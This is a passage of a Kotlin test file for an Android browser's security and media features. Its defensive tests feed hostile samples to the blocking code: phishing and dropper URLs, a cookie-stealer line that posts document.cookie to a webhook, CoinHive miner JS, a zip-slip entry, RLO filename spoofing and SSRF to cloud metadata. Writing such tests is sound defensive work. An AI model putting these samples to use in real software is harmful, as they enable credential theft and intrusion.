        // 3. Authority '@' credential spoofing
        val authoritySpoof = engine.inspectUrl("https://accounts.google.com@evil.example/login", context)
        assertTrue(authoritySpoof.isBlocked)
        assertEquals("URL Spoofing Phishing", authoritySpoof.category)

        // 4. Typo-squatted brand lures
        val typoVerdict = engine.inspectUrl("https://accounts-g00gle-verify.tk/signin", context)
        assertTrue(typoVerdict.isBlocked)
        assertEquals("Phishing Lookalike", typoVerdict.category)

        // 5. Raw public-IP HTTP APK dropper
        val ipDropper = engine.inspectUrl("http://45.33.32.156/update.apk", context)
        assertTrue(ipDropper.isBlocked)
        assertEquals("Unencrypted IP Executable Dropper", ipDropper.category)

        // 6. Dangerous external/local schemes
        val fileScheme = engine.inspectUrl("file:///data/data/com.example/shared_prefs/secret.xml", context)
        assertTrue(fileScheme.isBlocked)
        val intentScheme = engine.inspectUrl("intent://scan/#Intent;scheme=zxing;end", context)
        assertTrue(intentScheme.isBlocked)

        // 7. HTTPS-First auto-upgrade for public HTTP hosts + session allow bypass
        val httpUpgrade = engine.inspectUrl("http://example.com/news?id=42", context)
        assertFalse(httpUpgrade.isBlocked)
        assertEquals("https://example.com/news?id=42", httpUpgrade.upgradedHttpsUrl)

        val blockedThenAllowedUrl = "https://coinhive.com/session-bypass-test.js"
        assertTrue(engine.inspectUrl(blockedThenAllowedUrl, context).isBlocked)
        engine.allowThreatUrlForSession(blockedThenAllowedUrl)
        assertFalse(engine.inspectUrl(blockedThenAllowedUrl, context).isBlocked)
    }

    @Test
    fun `download guard blocks rlo unicode spoofing double extensions and disguised native binaries`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.security.MalwareProtectionEngine
        engine.ensureInitialized(context)

        // 1. RLO Unicode extension spoofing (`cod\u202Efdp.apk` renders visually like `codapk.pdf`)
        val rloVerdict = engine.inspectDownload(
            url = "https://cdn.example.org/files/cod\u202Efdp.apk",
            rawFilename = "cod\u202Efdp.apk",
            mimeType = "application/vnd.android.package-archive",
            context = context
        )
        assertTrue(rloVerdict.hadBidiSpoof)
        assertTrue(rloVerdict.isCriticalBlock)
        assertFalse(engine.hasBidiOverrideSpoof(rloVerdict.sanitizedFileName))
        assertEquals("codfdp.apk", rloVerdict.sanitizedFileName)

        // 2. Double extension masquerade (.pdf.apk)
        val doubleExt = engine.inspectDownload(
            url = "https://example.org/invoice_2026.pdf.apk",
            rawFilename = "invoice_2026.pdf.apk",
            mimeType = "application/pdf",
            context = context
        )
        assertTrue(doubleExt.isCriticalBlock)
        assertTrue(doubleExt.isDisguisedExecutable)

        // 3. Disguised ELF / DEX binaries masquerading as .pdf or .mp4 via magic header inspection
        val tempDir = java.io.File(context.cacheDir, "malware_magic_test").apply {
            deleteRecursively()
            mkdirs()
        }
        try {
            val fakePdfWithElf = java.io.File(tempDir, "statement.pdf")
            fakePdfWithElf.writeBytes(byteArrayOf(0x7F, 'E'.code.toByte(), 'L'.code.toByte(), 'F'.code.toByte(), 2, 1, 1, 0))
            val elfResult = com.example.data.downloader.MediaProcessingEngine.validateUniversalFile(
                file = fakePdfWithElf,
                expectedExtension = "pdf",
                expectedMimeType = "application/pdf"
            )
            assertFalse(elfResult.isValid)
            assertTrue(elfResult.errorReason!!.contains("ELF", ignoreCase = true))

            val fakeMp4WithDex = java.io.File(tempDir, "clip.mp4")
            fakeMp4WithDex.writeBytes(byteArrayOf('d'.code.toByte(), 'e'.code.toByte(), 'x'.code.toByte(), '\n'.code.toByte(), 0x30, 0x33, 0x35, 0x00))
            val dexError = engine.detectDisguisedBinaryError(
                "clip.mp4",
                byteArrayOf('d'.code.toByte(), 'e'.code.toByte(), 'x'.code.toByte(), '\n'.code.toByte())
            )
            org.junit.Assert.assertNotNull(dexError)
            assertTrue(dexError!!.contains("DEX", ignoreCase = true))
        } finally {
            tempDir.deleteRecursively()
        }
    }

    @Test
    fun `extension auditor blocks native binaries zip slip cryptominers credential stealers and ssrf`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val extEngine = com.example.data.browser.BrowserExtensionEngine(context)
        com.example.data.security.MalwareProtectionEngine.ensureInitialized(context)

        fun buildZip(entries: List<Pair<String, ByteArray>>): ByteArray {
            val baos = java.io.ByteArrayOutputStream()
            java.util.zip.ZipOutputStream(baos).use { zos ->
                for ((name, bytes) in entries) {
                    zos.putNextEntry(java.util.zip.ZipEntry(name))
                    zos.write(bytes)
                    zos.closeEntry()
                }
            }
            return baos.toByteArray()
        }

        val validManifest = """{"manifest_version":3,"name":"BadExt","version":"1.0"}""".toByteArray()

        // 1. Archive with disguised native binary (.so / .dex) or cryptominer JS is rejected
        val minerZip = buildZip(
            listOf(
                "manifest.json" to validManifest,
                "bg.js" to "var miner = new CoinHive.Anonymous('key'); miner.start();".toByteArray()
            )
        )
        val minerImport = extEngine.importExtensionFromBytes("miner.zip", minerZip)
        assertTrue(minerImport.isFailure)

        val stealerZip = buildZip(
            listOf(
                "manifest.json" to validManifest,
                "content.js" to "fetch('https://discord.com/api/webhooks/12345/abc', {body: document.cookie});".toByteArray()
            )
        )
        val stealerImport = extEngine.importExtensionFromBytes("stealer.zip", stealerZip)
        assertTrue(stealerImport.isFailure)

        val disguisedNativeZip = buildZip(
            listOf(
                "manifest.json" to validManifest,
                "payload.png" to byteArrayOf(0x7F, 'E'.code.toByte(), 'L'.code.toByte(), 'F'.code.toByte(), 2, 1, 1, 0)
            )
        )
        val nativeImport = extEngine.importExtensionFromBytes("native_blob.zip", disguisedNativeZip)
        assertTrue(nativeImport.isFailure)

        val zipSlipZip = buildZip(
            listOf(
                "manifest.json" to validManifest,
                "../../evil_override.txt" to "pwned".toByteArray()
            )
        )
        val zipSlipRes = com.example.data.security.MalwareProtectionEngine.isDisallowedExtensionBinaryName("lib/payload.dex")
        assertTrue(zipSlipRes)
        // Zip-slip entries outside extractRoot are never written to parent directories
        val outsideTarget = java.io.File(context.filesDir, "evil_override.txt")
        outsideTarget.delete()
        extEngine.importExtensionFromBytes("zipslip.zip", zipSlipZip)
        assertFalse(outsideTarget.exists())

        // 2. SSRF guard blocks loopback and cloud metadata endpoints from extension XHR
        val loopbackResp = org.json.JSONObject(
            extEngine.executeCrossOriginXhr("""{"method":"GET","url":"http://127.0.0.1:8080/admin"}""")
        )
        assertEquals(403, loopbackResp.getInt("status"))

        val metadataResp = org.json.JSONObject(
            extEngine.executeCrossOriginXhr("""{"method":"GET","url":"http://169.254.169.254/latest/meta-data/"}""")
        )
        assertEquals(403, metadataResp.getInt("status"))
    }

    @Test
    fun `saved passwords and passkeys are aes256gcm encrypted at rest and enforce webauthn origin binding`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = com.example.data.browser.BrowserStateRepository(context)
        repo.clearSavedPasswords()

        val secretPassword = "UltraSecret!VaultPassword#2026"
        repo.addOrUpdateSavedPassword(
            url = "https://accounts.example.com/login",
            username = "security.tester@example.com",
            password = secretPassword
        )

        // Verify SharedPreferences stores AES-GCM ciphertext, NEVER plaintext password
        val statePrefs = context.getSharedPreferences("dragon_browser_state", Context.MODE_PRIVATE)
        val rawStoredPasswords = statePrefs.getString("browser_saved_passwords_v1", "").orEmpty()
        assertTrue(rawStoredPasswords.startsWith("ENC_AESGCM_V1:"))
        assertFalse(rawStoredPasswords.contains(secretPassword))
        assertFalse(rawStoredPasswords.contains("security.tester@example.com"))

        // Verify fresh repository instance decrypts transparently
        val reloaded = com.example.data.browser.BrowserStateRepository(context)
        assertTrue(
            reloaded.savedPasswordsFlow.value.any {
                it.domain == "accounts.example.com" &&
                    it.username == "security.tester@example.com" &&
                    it.password == secretPassword
            }
        )

        // Verify passkey manager encrypts stored passkeys & rejects insecure HTTP or cross-domain rpId spoofing
        val createSpoofOpts = org.json.JSONObject().apply {
            put("rp", org.json.JSONObject().apply {
                put("id", "google.com")
                put("name", "Google")
            })
            put("user", org.json.JSONObject().apply {
                put("id", "dXNlcg")
                put("name", "victim@google.com")
                put("displayName", "Victim")
            })
            put("challenge", "Y2hhbGxlbmdl")
        }.toString()

        val spoofResult = org.json.JSONObject(
            reloaded.passkeyManager.createPasskeyFromWebView(
                optionsJsonStr = createSpoofOpts,
                originUrl = "https://evil-phishing.example/login",
                activityContext = null
            )
        )
        assertFalse(spoofResult.optBoolean("ok", true))
        assertTrue(spoofResult.optString("error").contains("cross-domain", ignoreCase = true))

        val httpResult = org.json.JSONObject(
            reloaded.passkeyManager.createPasskeyFromWebView(
                optionsJsonStr = createSpoofOpts,
                originUrl = "http://google.com/login",
                activityContext = null
            )
        )
        assertFalse(httpResult.optBoolean("ok", true))
        assertTrue(httpResult.optString("error").contains("HTTPS", ignoreCase = true))

        // Valid HTTPS passkey storage also encrypts shared prefs with ENC_AESGCM_V1:
        val validCreateOpts = org.json.JSONObject().apply {
            put("rp", org.json.JSONObject().apply {
                put("id", "example.org")
                put("name", "Example Org")
            })
            put("user", org.json.JSONObject().apply {
                put("id", "dXNlcl8x")
                put("name", "alice@example.org")
                put("displayName", "Alice")
            })
            put("challenge", "Y2hhbGxlbmdlX3ZhbGlk")
        }.toString()
        val validResult = org.json.JSONObject(
            reloaded.passkeyManager.createPasskeyFromWebView(
                optionsJsonStr = validCreateOpts,
                originUrl = "https://login.example.org/webauthn",
                activityContext = null
            )
        )
        assertTrue(validResult.optBoolean("ok", false))
        val passkeyPrefs = context.getSharedPreferences("dragon_browser_passkeys_v1", Context.MODE_PRIVATE)
        val rawPasskeys = passkeyPrefs.getString("stored_passkeys_json_v1", "").orEmpty()
        assertTrue(rawPasskeys.startsWith("ENC_AESGCM_V1:"))
        assertFalse(rawPasskeys.contains("alice@example.org"))
    }

    @Test
    fun `removeLocalPasswords clears local passwords and device vaults cleanly`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = com.example.data.browser.BrowserStateRepository(context)
        repo.clearSavedPasswords()
        repo.onWebViewGoogleAccountDetected(
            email = "local.wipe.test@gmail.com",
            displayName = "Local Wipe Tester",
            hasSessionCookies = true
        )
        repo.addOrUpdateSavedPassword(
            url = "https://github.com/login",
            username = "local.wipe.test@gmail.com",
            password = "DeviceLocalPassword!123"
        )
        repo.addOrUpdateSavedPassword(
            url = "https://example.org/login",
            username = "alice",
            password = "SecondPassword!456"
        )
        assertEquals(2, repo.savedPasswordsFlow.value.size)

        val removedCount = repo.removeLocalPasswords()
        assertEquals(2, removedCount)
        assertTrue(repo.savedPasswordsFlow.value.isEmpty())

        // Reloading repository must stay empty (both prefs and local account vault cleared)
        val reloaded = com.example.data.browser.BrowserStateRepository(context)
        assertTrue(reloaded.savedPasswordsFlow.value.isEmpty())
    }

    @Test
    fun `BrowserPipController transitions shouldEnterPipOnMinimize across playback states`() {
        val controller = com.example.data.browser.BrowserPipController
        controller.reset()

        assertFalse(controller.stateFlow.value.shouldEnterPipOnMinimize)
        assertFalse(controller.isInPipModeFlow.value)

        // Browser closed + video state should still remain false
        controller.updateActiveTab("tab_1")
        controller.updateWebVideoState("tab_1", isPlaying = true, videoWidth = 1920, videoHeight = 1080)
        assertFalse(controller.stateFlow.value.shouldEnterPipOnMinimize)

        // Opening browser enables auto-PiP only when playing, fullscreen, or stream player active
        controller.updateBrowserOpen(true)
        assertTrue(controller.stateFlow.value.shouldEnterPipOnMinimize)

        // Pausing inline video disables auto-PiP when neither fullscreen nor stream player is open
        controller.updateWebVideoState("tab_1", isPlaying = false, videoWidth = 1920, videoHeight = 1080)
        assertFalse(controller.stateFlow.value.shouldEnterPipOnMinimize)

        // Fullscreen custom view enables auto-PiP
        controller.updateFullscreenVideo(true)
        assertTrue(controller.stateFlow.value.shouldEnterPipOnMinimize)
        controller.updateFullscreenVideo(false)
        assertFalse(controller.stateFlow.value.shouldEnterPipOnMinimize)

        // Stream player overlay enables auto-PiP
        controller.updateStreamPlayerOpen(true)
        assertTrue(controller.stateFlow.value.shouldEnterPipOnMinimize)

        // Updates from inactive background tab must not overwrite active tab PiP state
        controller.updateStreamPlayerOpen(false)
        controller.updateWebVideoState("tab_background", isPlaying = true, videoWidth = 1280, videoHeight = 720)
        assertFalse(controller.stateFlow.value.shouldEnterPipOnMinimize)

        // Switching active tab preserves ongoing video playback & PiP readiness until manually paused/closed
        controller.updateWebVideoState("tab_1", isPlaying = true, videoWidth = 1920, videoHeight = 1080)
        assertTrue(controller.stateFlow.value.shouldEnterPipOnMinimize)
        controller.updateActiveTab("tab_2")
        assertTrue(controller.stateFlow.value.shouldEnterPipOnMinimize)
        controller.updateWebVideoState("tab_2", isPlaying = false, videoWidth = 1920, videoHeight = 1080)
        assertFalse(controller.stateFlow.value.shouldEnterPipOnMinimize)

        // Closing browser resets PiP playback state cleanly
        controller.updateWebVideoState("tab_2", isPlaying = true, videoWidth = 1920, videoHeight = 1080)
        assertTrue(controller.stateFlow.value.shouldEnterPipOnMinimize)
        controller.updateBrowserOpen(false)
        assertFalse(controller.stateFlow.value.shouldEnterPipOnMinimize)

        controller.onPipModeChanged(true)
        assertTrue(controller.isInPipModeFlow.value)
        controller.reset()
        assertFalse(controller.isInPipModeFlow.value)
    }

    @Test
    fun `BrowserPipController clamps extreme video aspect ratios and computes sourceRectHint safely`() {
        val controller = com.example.data.browser.BrowserPipController
        controller.reset()

        // Invalid dimensions fall back cleanly to 16:9
        assertEquals(16 to 9, controller.computeSafePipAspectRatio(0, 0))
        assertEquals(16 to 9, controller.computeSafePipAspectRatio(-100, 720))

        // Standard 16:9 stays within valid Android PiP range
        val (stdW, stdH) = controller.computeSafePipAspectRatio(1920, 1080)
        val stdRatio = stdW.toDouble() / stdH.toDouble()
        assertEquals(16.0 / 9.0, stdRatio, 0.01)

        // Ultrawide video (> 2.39:1) is clamped strictly within <= 2.35:1
        val (wideW, wideH) = controller.computeSafePipAspectRatio(4000, 800)
        val wideRatio = wideW.toDouble() / wideH.toDouble()
        assertTrue(wideRatio in 0.42..2.39)
        assertEquals(235 to 100, wideW to wideH)

        // Ultra-tall portrait video (< 1:2.39) is clamped strictly within >= 1:2.35
        val (tallW, tallH) = controller.computeSafePipAspectRatio(500, 3000)
        val tallRatio = tallW.toDouble() / tallH.toDouble()
        assertTrue(tallRatio in 0.42..2.39)
        assertEquals(100 to 235, tallW to tallH)

        // sourceRectHint computes accurate inline sub-rect inside containerRect
        val container = android.graphics.Rect(0, 100, 1000, 2100) // w=1000, h=2000
        val inlineState = com.example.data.browser.PipPlaybackState(
            isBrowserOpen = true,
            activeTabId = "tab_1",
            isVideoPlaying = true,
            videoLeftFrac = 0.1f,
            videoTopFrac = 0.25f,
            videoRightFrac = 0.9f,
            videoBottomFrac = 0.55f,
            containerRect = container
        )
        val subRect = controller.computeSourceRectHint(inlineState)
        assertEquals(android.graphics.Rect(100, 600, 900, 1200), subRect)

        // Fullscreen / Stream Player always returns the full container rect
        val fsRect = controller.computeSourceRectHint(inlineState.copy(isFullscreenVideo = true))
        assertEquals(container, fsRect)

        // Building PictureInPictureParams on API 26+ succeeds without throwing even for extreme dimensions
        val context = ApplicationProvider.getApplicationContext<Context>()
        val params = controller.buildPictureInPictureParams(
            context,
            inlineState.copy(videoWidth = 5000, videoHeight = 500)
        )
        org.junit.Assert.assertNotNull(params)

        // enterPipFromWebRequest updates playback dimensions and marks shouldEnterPipOnMinimize
        val activity = org.robolectric.Robolectric.buildActivity(MainActivity::class.java).create().get()
        controller.enterPipFromWebRequest(
            activity = activity,
            tabId = "tab_yt",
            videoWidth = 1920,
            videoHeight = 1080,
            leftFrac = 0.05f,
            topFrac = 0.1f,
            rightFrac = 0.95f,
            bottomFrac = 0.6f
        )
        assertTrue(controller.stateFlow.value.shouldEnterPipOnMinimize)
        assertEquals("tab_yt", controller.stateFlow.value.activeTabId)
        assertEquals(1920, controller.stateFlow.value.videoWidth)
        assertEquals(1080, controller.stateFlow.value.videoHeight)
        // Does not crash on Robolectric without hardware PiP feature
        assertFalse(controller.hasPipPermission(context))

        controller.reset()
    }

    @Test
    fun `BrowserPipController floatingPipTabId persists across tab switches without closing tab`() {
        val controller = com.example.data.browser.BrowserPipController
        controller.reset()
        controller.updateBrowserOpen(true)
        controller.updateActiveTab("tab_video")

        // Activating in-app floating PiP marks floatingPipTabId without forcing immediate minimize
        controller.updateFloatingPipTab("tab_video")
        assertEquals("tab_video", controller.stateFlow.value.floatingPipTabId)
        assertTrue(controller.stateFlow.value.shouldEnterPipOnMinimize)

        // Switching to another tab keeps floatingPipTabId alive & OS-minimize-ready
        controller.updateActiveTab("tab_article")
        assertEquals("tab_article", controller.stateFlow.value.activeTabId)
        assertEquals("tab_video", controller.stateFlow.value.floatingPipTabId)
        assertFalse(controller.stateFlow.value.isVideoPlaying)
        assertTrue(controller.stateFlow.value.shouldEnterPipOnMinimize)

        // Metadata updates from the floating background tab preserve activeTabId while updating aspect dimensions
        controller.updateWebVideoState("tab_video", isPlaying = true, videoWidth = 1080, videoHeight = 1920)
        assertEquals("tab_article", controller.stateFlow.value.activeTabId)
        assertEquals(1080, controller.stateFlow.value.videoWidth)
        assertEquals(1920, controller.stateFlow.value.videoHeight)

        // Closing the floating window clears floatingPipTabId and disables auto-PiP when active tab has no video
        controller.updateFloatingPipTab(null)
        assertEquals(null, controller.stateFlow.value.floatingPipTabId)
        assertFalse(controller.stateFlow.value.shouldEnterPipOnMinimize)

        controller.reset()
    }

    @Test
    fun `BrowserPipController and DragonMediaPlaybackService keep audio and video alive for minimize and screen off`() {
        val controller = com.example.data.browser.BrowserPipController
        controller.reset()
        controller.updateBrowserOpen(true)
        controller.updateActiveTab("tab_music")

        // Audio-only playback keeps background service alive without triggering unwanted video PiP
        controller.updateMediaPlaybackState(
            tabId = "tab_music",
            isVideoPlaying = false,
            isAudioPlaying = true,
            mediaTitle = "Ambient Mix",
            mediaUrl = "https://music.example.org/track"
        )
        val audioState = controller.stateFlow.value
        assertTrue(audioState.shouldKeepBackgroundMediaAlive)
        assertFalse(audioState.shouldEnterPipOnMinimize)
        assertTrue(com.example.service.DragonMediaPlaybackService.hasPlayableBackgroundMedia(audioState))
        assertEquals("Ambient Mix", com.example.service.DragonMediaPlaybackService.resolveDisplayTitle(audioState))
        assertTrue(
            com.example.service.DragonMediaPlaybackService.resolveDisplaySubtitle(audioState)
                .contains("music.example.org")
        )

        val context = ApplicationProvider.getApplicationContext<Context>()
        val notification = com.example.service.DragonMediaPlaybackService.buildMediaNotification(
            context = context,
            state = audioState
        )
        org.junit.Assert.assertNotNull(notification)
        assertEquals(
            "Ambient Mix",
            notification.extras.getString(android.app.Notification.EXTRA_TITLE)
        )
        assertTrue((notification.flags and android.app.Notification.FLAG_ONGOING_EVENT) != 0)

        // Dispatching stop playback cleanly stops background playback tracking
        controller.dispatchStopPlayback()
        val stoppedState = controller.stateFlow.value
        assertFalse(stoppedState.isAudioPlaying)
        assertFalse(stoppedState.isVideoPlaying)
        assertFalse(stoppedState.shouldKeepBackgroundMediaAlive)
        assertFalse(com.example.service.DragonMediaPlaybackService.hasPlayableBackgroundMedia(stoppedState))

        controller.reset()
    }

    @Test
    fun `PiP playback control helpers cycle speeds and format timecodes accurately`() {
        assertEquals(1.25f, com.example.ui.screens.nextPipPlaybackRate(1.0f), 0.001f)
        assertEquals(1.5f, com.example.ui.screens.nextPipPlaybackRate(1.25f), 0.001f)
        assertEquals(2.0f, com.example.ui.screens.nextPipPlaybackRate(1.5f), 0.001f)
        assertEquals(0.75f, com.example.ui.screens.nextPipPlaybackRate(2.0f), 0.001f)
        assertEquals(1.0f, com.example.ui.screens.nextPipPlaybackRate(0.75f), 0.001f)

        assertEquals("0:00", com.example.ui.screens.formatPipTimeSeconds(0f))
        assertEquals("0:00", com.example.ui.screens.formatPipTimeSeconds(Float.NaN))
        assertEquals("1:05", com.example.ui.screens.formatPipTimeSeconds(65f))
        assertEquals("1:02:05", com.example.ui.screens.formatPipTimeSeconds(3725f))

        assertEquals("1x", com.example.ui.screens.formatPipRateBadge(1.0f))
        assertEquals("1.25x", com.example.ui.screens.formatPipRateBadge(1.25f))
        assertEquals("1.5x", com.example.ui.screens.formatPipRateBadge(1.5f))
        assertEquals("2x", com.example.ui.screens.formatPipRateBadge(2.0f))
        assertEquals("0.75x", com.example.ui.screens.formatPipRateBadge(0.75f))
    }

    @Test
    fun `LocalBrowserProxyServer tunnels HTTP CONNECT blocks ad domains via AdBlocker DNS and handles upstream HTTP SOCKS5 auth and SOCKS4a proxies`() {
        val loopback = java.net.InetAddress.getByAddress(byteArrayOf(127, 0, 0, 1))

        // 1. Target origin server echoing HTTP requests and raw CONNECT tunnel payloads
        val originServer = java.net.ServerSocket(0, 16, loopback)
        val originPort = originServer.localPort
        val originThread = Thread {
            while (!originServer.isClosed) {
                val s = try { originServer.accept() } catch (_: Throwable) { break }
                Thread {
                    s.use { sock ->
                        sock.soTimeout = 3000
                        val inp = sock.getInputStream()
                        val out = sock.getOutputStream()
                        val firstLine = readLineIso(inp)
                        if (firstLine.startsWith("GET ") || firstLine.startsWith("POST ")) {
                            while (true) {
                                val h = readLineIso(inp)
                                if (h.isEmpty()) break
                            }
                            val body = "ORIGIN_OK:$firstLine"
                            val resp = "HTTP/1.1 200 OK\r\nContent-Length: ${body.length}\r\nConnection: close\r\n\r\n$body"
                            out.write(resp.toByteArray(Charsets.ISO_8859_1))
                            out.flush()
                        } else if (firstLine == "TUNNEL_PING") {
                            out.write("TUNNEL_PONG\r\n".toByteArray(Charsets.ISO_8859_1))
                            out.flush()
                        }
                    }
                }.start()
            }
        }.apply { isDaemon = true; start() }

        // 2. Mock upstream HTTP proxy verifying Basic Proxy-Authorization
        val expectedAuth = com.example.data.browser.LocalBrowserProxyServer.buildBasicAuthHeader("dragon", "s3cr3t")
        val httpUpstreamAuthSeen = java.util.concurrent.atomic.AtomicBoolean(false)
        val upstreamHttpProxy = java.net.ServerSocket(0, 16, loopback)
        val upstreamHttpPort = upstreamHttpProxy.localPort
        val upstreamHttpThread = Thread {
            while (!upstreamHttpProxy.isClosed) {
                val s = try { upstreamHttpProxy.accept() } catch (_: Throwable) { break }
                Thread {
                    s.use { sock ->
                        sock.soTimeout = 3000
                        val inp = sock.getInputStream()
                        val out = sock.getOutputStream()
                        val reqLine = readLineIso(inp)
                        var sawAuth = false
                        while (true) {
                            val h = readLineIso(inp)
                            if (h.isEmpty()) break
                            if (h.equals("Proxy-Authorization: $expectedAuth", ignoreCase = true)) {
                                sawAuth = true
                            }
                        }
                        if (!sawAuth) {
                            out.write("HTTP/1.1 407 Proxy Auth Required\r\nContent-Length: 0\r\n\r\n".toByteArray(Charsets.ISO_8859_1))
                            out.flush()
                            return@use
                        }
                        httpUpstreamAuthSeen.set(true)
                        if (reqLine.startsWith("CONNECT ")) {
                            out.write("HTTP/1.1 200 Connection Established\r\n\r\n".toByteArray(Charsets.ISO_8859_1))
                            out.flush()
                            java.net.Socket(loopback, originPort).use { target ->
                                target.soTimeout = 3000
                                val ping = readLineIso(inp)
                                target.getOutputStream().write("$ping\r\n".toByteArray(Charsets.ISO_8859_1))
                                target.getOutputStream().flush()
                                val pong = readLineIso(target.getInputStream())
                                out.write("$pong\r\n".toByteArray(Charsets.ISO_8859_1))
                                out.flush()
                            }
                        } else {
                            val body = "VIA_HTTP_PROXY:$reqLine"
                            val resp = "HTTP/1.1 200 OK\r\nContent-Length: ${body.length}\r\nConnection: close\r\n\r\n$body"
                            out.write(resp.toByteArray(Charsets.ISO_8859_1))
                            out.flush()
                        }
                    }
                }.start()
            }
        }.apply { isDaemon = true; start() }

        // 3. Mock upstream SOCKS5 proxy requiring RFC 1929 username/password auth + ATYP=0x03 domain
        val socks5DomainSeen = java.util.concurrent.atomic.AtomicReference<String>("")
        val upstreamSocks5 = java.net.ServerSocket(0, 16, loopback)
        val upstreamSocks5Port = upstreamSocks5.localPort
        val upstreamSocks5Thread = Thread {
            while (!upstreamSocks5.isClosed) {
                val s = try { upstreamSocks5.accept() } catch (_: Throwable) { break }
                Thread {
                    s.use { sock ->
                        sock.soTimeout = 3000
                        val inp = sock.getInputStream()
                        val out = sock.getOutputStream()
                        val ver = inp.read()
                        val nMethods = inp.read()
                        val methods = ByteArray(nMethods)
                        readExact(inp, methods)
                        if (ver != 0x05 || !methods.contains(0x02.toByte())) {
                            out.write(byteArrayOf(0x05, 0xFF.toByte()))
                            return@use
                        }
                        out.write(byteArrayOf(0x05, 0x02))
                        out.flush()

                        // RFC 1929 auth
                        val authVer = inp.read()
                        val uLen = inp.read()
                        val uBytes = ByteArray(uLen); readExact(inp, uBytes)
                        val pLen = inp.read()
                        val pBytes = ByteArray(pLen); readExact(inp, pBytes)
                        val user = String(uBytes, Charsets.UTF_8)
                        val pass = String(pBytes, Charsets.UTF_8)
                        if (authVer != 0x01 || user != "s5user" || pass != "s5pass") {
                            out.write(byteArrayOf(0x01, 0x01))
                            return@use
                        }
                        out.write(byteArrayOf(0x01, 0x00))
                        out.flush()

                        // CONNECT request
                        val reqHead = ByteArray(4); readExact(inp, reqHead)
                        val atyp = reqHead[3].toInt() and 0xFF
                        val destHost = when (atyp) {
                            0x03 -> {
                                val dLen = inp.read()
                                val dBytes = ByteArray(dLen); readExact(inp, dBytes)
                                String(dBytes, Charsets.UTF_8)
                            }
                            0x01 -> {
                                val ip = ByteArray(4); readExact(inp, ip)
                                java.net.InetAddress.getByAddress(ip).hostAddress.orEmpty()
                            }
                            else -> ""
                        }
                        val portBytes = ByteArray(2); readExact(inp, portBytes)
                        socks5DomainSeen.set(destHost)
                        out.write(byteArrayOf(0x05, 0x00, 0x00, 0x01, 127, 0, 0, 1, 0, 0))
                        out.flush()

                        java.net.Socket(loopback, originPort).use { target ->
                            target.soTimeout = 3000
                            val ping = readLineIso(inp)
                            target.getOutputStream().write("$ping\r\n".toByteArray(Charsets.ISO_8859_1))
                            target.getOutputStream().flush()
                            val pong = readLineIso(target.getInputStream())
                            out.write("$pong\r\n".toByteArray(Charsets.ISO_8859_1))
                            out.flush()
                        }
                    }
                }.start()
            }
        }.apply { isDaemon = true; start() }

        // 4. Mock upstream SOCKS4a proxy verifying 0.0.0.1 sentinel + domain name
        val socks4aDomainSeen = java.util.concurrent.atomic.AtomicReference<String>("")
        val upstreamSocks4a = java.net.ServerSocket(0, 16, loopback)
        val upstreamSocks4aPort = upstreamSocks4a.localPort
        val upstreamSocks4aThread = Thread {
            while (!upstreamSocks4a.isClosed) {
                val s = try { upstreamSocks4a.accept() } catch (_: Throwable) { break }
                Thread {
                    s.use { sock ->
                        sock.soTimeout = 3000
                        val inp = sock.getInputStream()
                        val out = sock.getOutputStream()
                        val head = ByteArray(8); readExact(inp, head)
                        while (true) {
                            val b = inp.read()
                            if (b <= 0) break
                        }
                        if (head[4].toInt() == 0 && head[5].toInt() == 0 && head[6].toInt() == 0 && head[7].toInt() != 0) {
                            val dBuf = java.io.ByteArrayOutputStream()
                            while (true) {
                                val b = inp.read()
                                if (b <= 0) break
                                dBuf.write(b)
                            }
                            socks4aDomainSeen.set(String(dBuf.toByteArray(), Charsets.UTF_8))
                        }
                        out.write(byteArrayOf(0x00, 0x5A, 0, 0, 127, 0, 0, 1))
                        out.flush()

                        java.net.Socket(loopback, originPort).use { target ->
                            target.soTimeout = 3000
                            val ping = readLineIso(inp)
                            target.getOutputStream().write("$ping\r\n".toByteArray(Charsets.ISO_8859_1))
                            target.getOutputStream().flush()
                            val pong = readLineIso(target.getInputStream())
                            out.write("$pong\r\n".toByteArray(Charsets.ISO_8859_1))
                            out.flush()
                        }
                    }
                }.start()
            }
        }.apply { isDaemon = true; start() }

        val dns = com.example.data.downloader.CloudflareWarpDns(
            initialEnabled = false,
            initialMode = com.example.data.downloader.DnsProviderMode.ADBLOCKER_DNS
        )
        var currentProxy: com.example.data.browser.BrowserProxyProfile? = null
        val localServer = com.example.data.browser.LocalBrowserProxyServer(
            dnsProvider = { dns },
            proxyProvider = { currentProxy }
        )

        try {
            val localPort = localServer.ensureStarted()
            assertTrue(localPort > 0)

            // Test A: AdBlocker DNS blocks ad domain at CONNECT layer with HTTP 403
            java.net.Socket(loopback, localPort).use { client ->
                client.soTimeout = 3000
                client.getOutputStream().write("CONNECT doubleclick.net:443 HTTP/1.1\r\nHost: doubleclick.net:443\r\n\r\n".toByteArray(Charsets.ISO_8859_1))
                client.getOutputStream().flush()
                val status = readLineIso(client.getInputStream())
                assertTrue("Expected 403 for sinkholed ad domain, got: $status", status.contains("403"))
            }

            // Test B: Direct plain HTTP tunneling to origin server
            java.net.Socket(loopback, localPort).use { client ->
                client.soTimeout = 3000
                client.getOutputStream().write("GET http://127.0.0.1:$originPort/direct-test HTTP/1.1\r\nHost: 127.0.0.1:$originPort\r\n\r\n".toByteArray(Charsets.ISO_8859_1))
                client.getOutputStream().flush()
                val allResp = String(client.getInputStream().readBytes(), Charsets.ISO_8859_1)
                assertTrue("Expected direct origin response, got: $allResp", allResp.contains("ORIGIN_OK:GET /direct-test"))
            }

            // Test C: Upstream HTTP proxy with Basic auth (bypass rule + CONNECT)
            currentProxy = com.example.data.browser.BrowserProxyProfile(
                name = "Auth HTTP",
                type = com.example.data.browser.BrowserProxyType.HTTP,
                host = "127.0.0.1",
                port = upstreamHttpPort,
                username = "dragon",
                password = "s3cr3t",
                bypassRules = listOf("127.0.0.1", "bypass.local")
            )
            java.net.Socket(loopback, localPort).use { client ->
                client.soTimeout = 3000
                client.getOutputStream().write("GET http://127.0.0.1:$originPort/bypass-check HTTP/1.1\r\nHost: 127.0.0.1:$originPort\r\n\r\n".toByteArray(Charsets.ISO_8859_1))
                client.getOutputStream().flush()
                val resp = String(client.getInputStream().readBytes(), Charsets.ISO_8859_1)
                assertTrue("Bypassed host should hit origin directly: $resp", resp.contains("ORIGIN_OK:GET /bypass-check"))
            }
            java.net.Socket(loopback, localPort).use { client ->
